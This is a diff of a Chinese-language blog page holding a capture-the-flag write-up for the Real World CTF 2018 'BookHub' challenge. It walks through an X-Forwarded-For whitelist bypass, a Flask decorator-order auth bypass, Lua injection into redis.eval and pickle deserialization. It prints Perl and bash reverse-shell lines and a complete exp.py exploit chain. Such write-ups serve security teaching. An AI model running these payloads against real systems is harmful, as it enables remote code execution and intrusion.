@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,39 +104,30 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>Detail</h2>
-
-<p>How to pwn bookhub?<br>
-http://52.52.4.252:8080/<br>
+<p>How to pwn bookhub?<br />
+http://52.52.4.252:8080/<br />
 hint: www.zip</p>
-
 <h2>Writeup</h2>
-
 <h3>0x01 Bypass IP</h3>
-
 <p>太垃圾了了，一开始掉进了XFF的坑里</p>
-
 <blockquote>
-<p><img src="https://img.virzz.com/15329721713858.jpg" alt=""></p>
+<p><img alt="" src="https://img.virzz.com/15329721713858.jpg" /></p>
 </blockquote>
+<p><strong>./bookhub/forms.py</strong></p>
+<pre><code class="python">class LoginForm(FlaskForm):
+    username = StringField('username', validators=[DataRequired()])
+    password = PasswordField('password', validators=[DataRequired()])
+    remember_me = BooleanField('remember_me', default=False)
 
-<p><strong>./bookhub/forms.py</strong><br>
-```python<br>
-class LoginForm(FlaskForm):<br>
-    username = StringField(&#39;username&#39;, validators=[DataRequired()])<br>
-    password = PasswordField(&#39;password&#39;, validators=[DataRequired()])<br>
-    remember<em>me = BooleanField(&#39;remember</em>me&#39;, default=False)</p>
-
-<pre><code>def validate_password(self, field):
-    address = get_remote_addr()
-    whitelist = os.environ.get(&#39;WHITELIST_IPADDRESS&#39;, &#39;10.0.0.1&#39;)
+    def validate_password(self, field):
+        address = get_remote_addr()
+        whitelist = os.environ.get('WHITELIST_IPADDRESS', '10.0.0.1')
 </code></pre>
 
-<pre><code>
-**./bookhub/helper.py**
-```python
-def get_remote_addr():
+<p><strong>./bookhub/helper.py</strong></p>
+<pre><code class="python">def get_remote_addr():
     address = flask.request.headers.get(
-        &#39;X-Forwarded-For&#39;, flask.request.remote_addr)
+        'X-Forwarded-For', flask.request.remote_addr)
 
     try:
         ipaddress.ip_address(address)
@@ -140,29 +139,18 @@ def get_remote_addr():
 </code></pre>
 
 <p>仔细看的时候才发现有个特殊的IP</p>
-
-<p><img src="https://img.virzz.com/15329693228681.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329693228681.jpg" /></p>
 <p>扫一波端口发现<strong>5000</strong>，访问后是新大陆</p>
-
-<p><img src="https://img.virzz.com/15329695869457.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329695869457.jpg" /></p>
 <p><strong>debug mode</strong></p>
-
-<p><img src="https://img.virzz.com/15329696502354.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329696502354.jpg" /></p>
 <h4>X-Forwarded-For(XFF)伪造</h4>
-
 <blockquote>
 <p>X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入RFC 7239（Forwarded HTTP Extension）标准之中。</p>
 </blockquote>
-
 <p><strong>格式 :</strong><code>X-Forwarded-For: client, proxy1, proxy2</code></p>
-
 <p>这个请求头可以被用户或者代理服务器修改的，因此也就可能存在<strong>XFF伪造</strong>的问题。</p>
-
 <p>以Nginx为例：</p>
-
 <pre><code>location / {
         proxy_pass http://webserver;
         proxy_set_header Host $host;
@@ -171,142 +159,120 @@ def get_remote_addr():
 </code></pre>
 
 <p><code>$proxy_add_x_forwarded_for</code>变量包含客户端请求头中的<code>X-Forwarded-For</code>，与<code>$remote_addr</code>用逗号分开，如果没有<code>X-Forwarded-For</code>请求头，则<code>$proxy_add_x_forwarded_for</code>等于<code>$remote_addr</code>。</p>
-
 <p>第一个代理获取的是客户端的<code>X-Forwarded-For</code>或者是<code>remote_addr</code>，而第二个代理获取的必然是第一个代理的<code>remote_addr</code>。</p>
-
 <p><strong>X-Forwarded-For: [xff|client_addr], proxy1, proxy2</strong></p>
-
-<p>所以，在代理的情况下，<code>address = flask.request.headers.get(<br>
-        &#39;X-Forwarded-For&#39;, flask.request.remote_addr)</code>获取到的就不是单个IP了，而是用<code>,</code>分割的IP字符串。</p>
-
-<p>PHP中获取IP的代码：<br>
-<code>php<br>
-// thinkphp_3.2.3<br>
-function get_client_ip($type = 0) {<br>
-    $type       =  $type ? 1 : 0;<br>
-    static $ip  =   NULL;<br>
-    if ($ip !== NULL) return $ip[$type];<br>
-    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {<br>
-        $arr    =   explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);<br>
-        $pos    =   array_search(&#39;unknown&#39;,$arr);<br>
-        if(false !== $pos) unset($arr[$pos]);<br>
-        $ip     =   trim($arr[0]);<br>
-    }elseif (isset($_SERVER[&#39;HTTP_CLIENT_IP&#39;])) {<br>
-        $ip     =   $_SERVER[&#39;HTTP_CLIENT_IP&#39;];<br>
-    }elseif (isset($_SERVER[&#39;REMOTE_ADDR&#39;])) {<br>
-        $ip     =   $_SERVER[&#39;REMOTE_ADDR&#39;];<br>
-    }<br>
-    // IP地址合法验证<br>
-    $long = sprintf(&quot;%u&quot;,ip2long($ip));<br>
-    $ip   = $long ? array($ip, $long) : array(&#39;0.0.0.0&#39;, 0);<br>
-    return $ip[$type];<br>
-}<br>
-</code></p>
-
-<p>分割<code>X-Forwarded-For</code>并获取第一个，也就是获取到有可能存在的伪造的<strong>[xff|client_addr]</strong></p>
-
-<h3>0x02 Login or Unauthorized Access (感谢chybeta大佬指正)</h3>
-
-<p>有一次掉进坑里，事实上，如图源码里的<strong>migrations</strong>，数据库里面根本没有用户，还zz地爆破弱口令</p>
-
-<p><strong>./bookhub/views/user.py</strong><br>
-```python<br>
-if app.debug:</p>
-
-<pre><code>@user_blueprint.route(&#39;/admin/system/&#39;)
-@login_required
-def system():
-
-@user_blueprint.route(&#39;/admin/system/change_name/&#39;, methods=[&#39;POST&#39;])
-@login_required
-def change_name():
-    ...
-
-@login_required
-@user_blueprint.route(&#39;/admin/system/refresh_session/&#39;, methods=[&#39;POST&#39;])
-def refresh_session():
+<p>所以，在代理的情况下，<code>address = flask.request.headers.get(
+        'X-Forwarded-For', flask.request.remote_addr)</code>获取到的就不是单个IP了，而是用<code>,</code>分割的IP字符串。</p>
+<p>PHP中获取IP的代码：</p>
+<pre><code class="php">// thinkphp_3.2.3
+function get_client_ip($type = 0) {
+    $type       =  $type ? 1 : 0;
+    static $ip  =   NULL;
+    if ($ip !== NULL) return $ip[$type];
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $arr    =   explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $pos    =   array_search('unknown',$arr);
+        if(false !== $pos) unset($arr[$pos]);
+        $ip     =   trim($arr[0]);
+    }elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip     =   $_SERVER['HTTP_CLIENT_IP'];
+    }elseif (isset($_SERVER['REMOTE_ADDR'])) {
+        $ip     =   $_SERVER['REMOTE_ADDR'];
+    }
+    // IP地址合法验证
+    $long = sprintf(&quot;%u&quot;,ip2long($ip));
+    $ip   = $long ? array($ip, $long) : array('0.0.0.0', 0);
+    return $ip[$type];
+}
 </code></pre>
 
-<pre><code>
-可以看出，**refresh_session()**的装饰器顺序和其他的不同。
+<p>分割<code>X-Forwarded-For</code>并获取第一个，也就是获取到有可能存在的伪造的<strong>[xff|client_addr]</strong></p>
+<h3>0x02 Login or Unauthorized Access (感谢chybeta大佬指正)</h3>
+<p>有一次掉进坑里，事实上，如图源码里的<strong>migrations</strong>，数据库里面根本没有用户，还zz地爆破弱口令</p>
+<p><strong>./bookhub/views/user.py</strong></p>
+<pre><code class="python">if app.debug:
 
-Python的装上器是一层一层添加的
+    @user_blueprint.route('/admin/system/')
+    @login_required
+    def system():
 
-```python
-@warp2
+    @user_blueprint.route('/admin/system/change_name/', methods=['POST'])
+    @login_required
+    def change_name():
+        ...
+
+    @login_required
+    @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
+    def refresh_session():
+</code></pre>
+
+<p>可以看出，<strong>refresh_session()</strong>的装饰器顺序和其他的不同。</p>
+<p>Python的装上器是一层一层添加的</p>
+<pre><code class="python">@warp2
 @warp1
 def func():
     print(1)
 </code></pre>
 
 <p>调用函数的时候：<code>func(warp2)-&gt;func(warp1)-&gt;func</code></p>
-
-<p>在Flask中，访问<code>/admin/system/</code>：system(user<em>blueprint)-&gt;system(login</em>required)-&gt;system()，这时候就会判断<strong>login_required</strong>对登陆状态进行验证。</p>
-
-<p>而访问<code>/admin/system/refresh_session/</code>：refresh<em>session(user</em>blueprint)-&gt;refresh<em>session()，这个地方就是没有**login</em>required**什么事了，也就造成了绕过权限控制的问题</p>
-
-<hr>
-
+<p>在Flask中，访问<code>/admin/system/ : system(user_blueprint)-&gt;system(login_required)-&gt;system()</code>，这时候就会判断<strong>login_required</strong>对登陆状态进行验证。</p>
+<p>而访问<code>/admin/system/refresh_session/ : refresh_session(user_blueprint)-&gt;refresh_session()</code>，这个地方就是没有<strong>login_required</strong>什么事了，也就造成了绕过权限控制的问题</p>
+<hr />
 <p>我还是太菜了</p>
-
 <h3>0x03 Redis &amp; Lua Injection</h3>
+<p><strong>./bookhub/views/user.py</strong></p>
+<pre><code class="python">if app.debug:
+    ...
+    @login_required
+    @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
+    def refresh_session():
 
-<p><strong>./bookhub/views/user.py</strong><br>
-```python<br>
-if app.debug:<br>
-    ...<br>
-    @login<em>required<br>
-    @user</em>blueprint.route(&#39;/admin/system/refresh<em>session/&#39;, methods=[&#39;POST&#39;])<br>
-    def refresh</em>session():</p>
+        status = 'success'
+        sessionid = flask.session.sid
+        prefix = app.config['SESSION_KEY_PREFIX']
 
-<pre><code>    status = &#39;success&#39;
-    sessionid = flask.session.sid
-    prefix = app.config[&#39;SESSION_KEY_PREFIX&#39;]
+        if flask.request.form.get('submit', None) == '1':
+            try:
+                rds.eval(rf'''
+                local function has_value (tab, val)
+                    for index, value in ipairs(tab) do
+                        if value == val then
+                            return true
+                        end
+                    end
+                    return false
+                end
 
-    if flask.request.form.get(&#39;submit&#39;, None) == &#39;1&#39;:
-        try:
-            rds.eval(rf&#39;&#39;&#39;
-            local function has_value (tab, val)
-                for index, value in ipairs(tab) do
-                    if value == val then
-                        return true
+                local inputs = {{ &quot;{prefix}{sessionid}&quot; }}
+                local sessions = redis.call(&quot;keys&quot;, &quot;{prefix}*&quot;)
+
+                for index, sid in ipairs(sessions) do
+                    if not has_value(inputs, sid) then
+                        redis.call(&quot;del&quot;, sid)
                     end
                 end
-                return false
-            end
+                ''', 0)
+            except redis.exceptions.ResponseError as e:
+                print(e)
+                app.logger.exception(e)
+                status = 'fail'
 
-            local inputs = {{ &quot;{prefix}{sessionid}&quot; }}
-            local sessions = redis.call(&quot;keys&quot;, &quot;{prefix}*&quot;)
-
-            for index, sid in ipairs(sessions) do
-                if not has_value(inputs, sid) then
-                    redis.call(&quot;del&quot;, sid)
-                end
-            end
-            &#39;&#39;&#39;, 0)
-        except redis.exceptions.ResponseError as e:
-            print(e)
-            app.logger.exception(e)
-            status = &#39;fail&#39;
-
-    return flask.jsonify(dict(status=status))
+        return flask.jsonify(dict(status=status))
 </code></pre>
 
-<pre><code>
-- **sessionid = flask.session.sid**
-- **rds.eval(...)**
-- **local inputs = {{ &quot;{prefix}{sessionid}&quot; }}**
-- **Lua Script Inject &amp; ByPass del**
-
-这一步就4个点，**sessionid**可控，并注入到**Lua脚本**被**redis.eval**执行，还得绕过**del**
-
-**Test Pyaload :** 
-```lua
--- 闭合语句
+<ul>
+<li><strong>sessionid = flask.session.sid</strong></li>
+<li><strong>rds.eval(&hellip;)</strong></li>
+<li><strong>local inputs = {{ &ldquo;{prefix}{sessionid}&rdquo; }}</strong></li>
+<li><strong>Lua Script Inject &amp; ByPass del</strong></li>
+</ul>
+<p>这一步就4个点，<strong>sessionid</strong>可控，并注入到<strong>Lua脚本</strong>被<strong>redis.eval</strong>执行，还得绕过<strong>del</strong></p>
+<p><strong>Test Pyaload :</strong> </p>
+<pre><code class="lua">-- 闭合语句
 local inputs = { &quot;{prefix}&quot; } 
 -- urlDecode 处理不可见字符
 local function urlDecode(s) 
-    s=string.gsub(s,&#39;%%(%x%x)&#39;,function(h) return string.char(tonumber(h, 16)) end) 
+    s=string.gsub(s,'%%(%x%x)',function(h) return string.char(tonumber(h, 16)) end) 
     return s 
 end
 -- 写payload
@@ -316,68 +282,54 @@ inputs ={ &quot;bookhub:session:sid&quot; } -- &quot; }
 </code></pre>
 
 <p>注入语句是没有换行的，当然Lua脚本的格式也和换行无关</p>
-
-<p><strong>Pyaload :</strong><br>
-<code>lua<br>
-&quot; } local function urlDecode(s) s=string.gsub(s,&#39;%%(%x%x)&#39;,function(h) return string.char(tonumber(h, 16)) end) return s end redis.call(&quot;set&quot;,&quot;bookhub:session:sid&quot;,urlDecode(&quot;payload&quot;)) inputs = { &quot;bookhub:session:sid&quot; } -- &quot; }<br>
-</code></p>
+<p><strong>Pyaload :</strong></p>
+<pre><code class="lua">&quot; } local function urlDecode(s) s=string.gsub(s,'%%(%x%x)',function(h) return string.char(tonumber(h, 16)) end) return s end redis.call(&quot;set&quot;,&quot;bookhub:session:sid&quot;,urlDecode(&quot;payload&quot;)) inputs = { &quot;bookhub:session:sid&quot; } -- &quot; }
+</code></pre>
 
 <p>其实一开始，没想到用<strong>urlDecode</strong>，Lua的十六进制用<code>\XX</code>而不是常见的<code>\xXX</code>，</p>
-
-<p><img src="https://img.virzz.com/15329727168502.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329727168502.jpg" /></p>
 <p>神一般的操作</p>
-
 <h3>0x04 flask_session Pickle &amp; Rebound Shell</h3>
-
-<p><strong>#flask_session/sessions.py</strong><br>
-<code>python<br>
-class RedisSessionInterface(SessionInterface):<br>
-    ...<br>
-    serializer = pickle<br>
-    ...<br>
-    def open_session(self, app, request):<br>
-        sid = request.cookies.get(app.session_cookie_name)<br>
-        ...<br>
-        val = self.redis.get(self.key_prefix + sid)<br>
-        if val is not None:<br>
-            try:<br>
-                data = self.serializer.loads(val)<br>
-                return self.session_class(data, sid=sid)<br>
-            except:<br>
-                return self.session_class(sid=sid, permanent=self.permanent)<br>
-        return self.session_class(sid=sid, permanent=self.permanent)<br>
-</code></p>
+<p><strong>#flask_session/sessions.py</strong></p>
+<pre><code class="python">class RedisSessionInterface(SessionInterface):
+    ...
+    serializer = pickle
+    ...
+    def open_session(self, app, request):
+        sid = request.cookies.get(app.session_cookie_name)
+        ...
+        val = self.redis.get(self.key_prefix + sid)
+        if val is not None:
+            try:
+                data = self.serializer.loads(val)
+                return self.session_class(data, sid=sid)
+            except:
+                return self.session_class(sid=sid, permanent=self.permanent)
+        return self.session_class(sid=sid, permanent=self.permanent)
+</code></pre>
 
 <ul>
 <li><strong>serializer = pickle</strong></li>
-<li><strong>sid = request.cookies.get(app.session<em>cookie</em>name)</strong></li>
+<li><strong>sid = request.cookies.get(app.session_cookie_name)</strong></li>
 <li><strong>data = self.serializer.loads(val)</strong></li>
 </ul>
-
 <p>明显的<strong>Python pickle 反序列化漏洞</strong></p>
-
-<pre><code class="language-python">class exp(object):
+<pre><code class="python">class exp(object):
 
     def __reduce__(self):
-        s = &quot;perl -e &#39;use Socket;$i=\&quot;%s\&quot;;$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};&#39;&quot; % (
+        s = &quot;perl -e 'use Socket;$i=\&quot;%s\&quot;;$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};'&quot; % (
             listen_ip, listen_port)
         return (os.system, (s,))
 </code></pre>
 
-<p>服务器有毒，<code>s = &quot;&quot;&quot;/bin/bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1&quot;&quot;&quot; % (<br>
+<p>服务器有毒，<code>s = """/bin/bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1""" % (
             listen_ip, listen_port)</code>，<strong>bash反弹</strong>死活不成功</p>
-
 <p>然后<strong>perl</strong>反弹成功了</p>
-
-<p><img src="https://img.virzz.com/15329714123968.jpg" alt=""></p>
-
-<p><strong>Flag : rwctf{fl45k<em>1s</em>a<em>MAg1cal</em>fr4mew0rk_t0000000000}</strong></p>
-
+<p><img alt="" src="https://img.virzz.com/15329714123968.jpg" /></p>
+<p><strong>Flag : rwctf{fl45k_1s_a_MAg1cal_fr4mew0rk_t0000000000}</strong></p>
 <h2>exp.py</h2>
-
-<pre><code class="language-python"># -*- coding:utf-8 -*-
-__AUTHOR__ = &#39;Virink&#39;
+<pre><code class="python"># -*- coding:utf-8 -*-
+__AUTHOR__ = 'Virink'
 
 import os
 import sys
@@ -390,74 +342,65 @@ except ImportError:
     import pickle
 
 URL = &quot;http://18.213.16.123:5000/&quot;
-listen_ip = &#39;your_vps_ip&#39;
+listen_ip = 'your_vps_ip'
 listen_port = 7979
 
 class exp(object):
 
     def __reduce__(self):
-        s = &quot;perl -e &#39;use Socket;$i=\&quot;%s\&quot;;$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};&#39;&quot; % (
+        s = &quot;perl -e 'use Socket;$i=\&quot;%s\&quot;;$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};'&quot; % (
             listen_ip, listen_port)
         return (os.system, (s,))
 
-if __name__ == &#39;__main__&#39;:
+if __name__ == '__main__':
     payload = urlencode(pickle.dumps([exp()]))
     # 插入payload并防止del
-    sid = &#39;\\&quot; } local function urlDecode(s) s=string.gsub(s,\&#39;%%(%x%x)\&#39;,function(h) return string.char(tonumber(h, 16)) end) return s end &#39; + \
-        &#39;redis.call(\\&quot;set\\&quot;,\\&quot;bookhub:session:qaq\\&quot;,urlDecode(\\&quot;%s\\&quot;)) inputs = { \&quot;bookhub:session:qaq\&quot; } --&#39; % (
+    sid = '\\&quot; } local function urlDecode(s) s=string.gsub(s,\'%%(%x%x)\',function(h) return string.char(tonumber(h, 16)) end) return s end ' + \
+        'redis.call(\\&quot;set\\&quot;,\\&quot;bookhub:session:qaq\\&quot;,urlDecode(\\&quot;%s\\&quot;)) inputs = { \&quot;bookhub:session:qaq\&quot; } --' % (
             payload)
     headers = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
     # 注入payload
-    headers[&quot;Cookie&quot;] = &#39;bookhub-session=&quot;%s&quot;&#39; % sid
-    res = req.get(URL + &#39;login/&#39;, headers=headers)
+    headers[&quot;Cookie&quot;] = 'bookhub-session=&quot;%s&quot;' % sid
+    res = req.get(URL + 'login/', headers=headers)
     if res.status_code == 200:
-        r = re.findall(r&#39;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&#39;,
-                       res.content.decode(&#39;utf-8&#39;))
+        r = re.findall(r'csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;',
+                       res.content.decode('utf-8'))
         if r:
             # refresh_session
-            headers[&#39;X-CSRFToken&#39;] = r[0]
-            data = {&#39;submit&#39;: &#39;1&#39;}
-            res = req.post(URL + &#39;admin/system/refresh_session/&#39;,
+            headers['X-CSRFToken'] = r[0]
+            data = {'submit': '1'}
+            res = req.post(URL + 'admin/system/refresh_session/',
                            data=data, headers=headers)
             if res.status_code == 200:
                 # 触发RCE
-                req.get(URL + &#39;login/&#39;,
-                        headers={&#39;Cookie&#39;: &#39;bookhub-session=qaq&#39;})
+                req.get(URL + 'login/',
+                        headers={'Cookie': 'bookhub-session=qaq'})
 </code></pre>
 
 <h2>感想</h2>
-
 <ol>
 <li>我还是太弱了</li>
 <li>我真的还是太弱了</li>
 <li>太弱了</li>
 </ol>
-
 <p>Web狗-&gt;没活路的样子，得熟悉各种语言的特性</p>
-
 <p>膜 PHITHON 神鬼莫测的出题思路</p>
-
 <ol>
 <li>XFF绕CDN 的坑</li>
 <li>Login代码 的坑</li>
 <li>Lua 的坑</li>
 <li>反弹 shell 的坑</li>
 </ol>
-
 <p>就让比赛主题<strong>Real World</strong>，很坑但很真实。</p>
-
 <p>神如Ph牛挖坑，菜鸡如我爬坑！</p>
-
 <h2>转载声明</h2>
-
 <p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/2504">RWCTF2018 BookHub Writeup &amp; 爬坑感悟</a></p>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2018/07/30/bookhub_for_rwctf2018_writeups.html" target="_blank">BookHub Writeup - Real World CTF 2018</a><br />
               <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
               <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-07-30 23:47:19">2018-07-30 23:47:19</time><br />
-              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-07-31 11:12:26">2018-07-31 11:12:26</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-07-31 23:57:54">2018-07-31 23:57:54</time><br />
               <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2018/07/30/bookhub_for_rwctf2018_writeups.html" title="BookHub Writeup - Real World CTF 2018" target="_blank">https://www.virzz.com/2018/07/30/bookhub_for_rwctf2018_writeups.html</a><br />
               <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
               <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
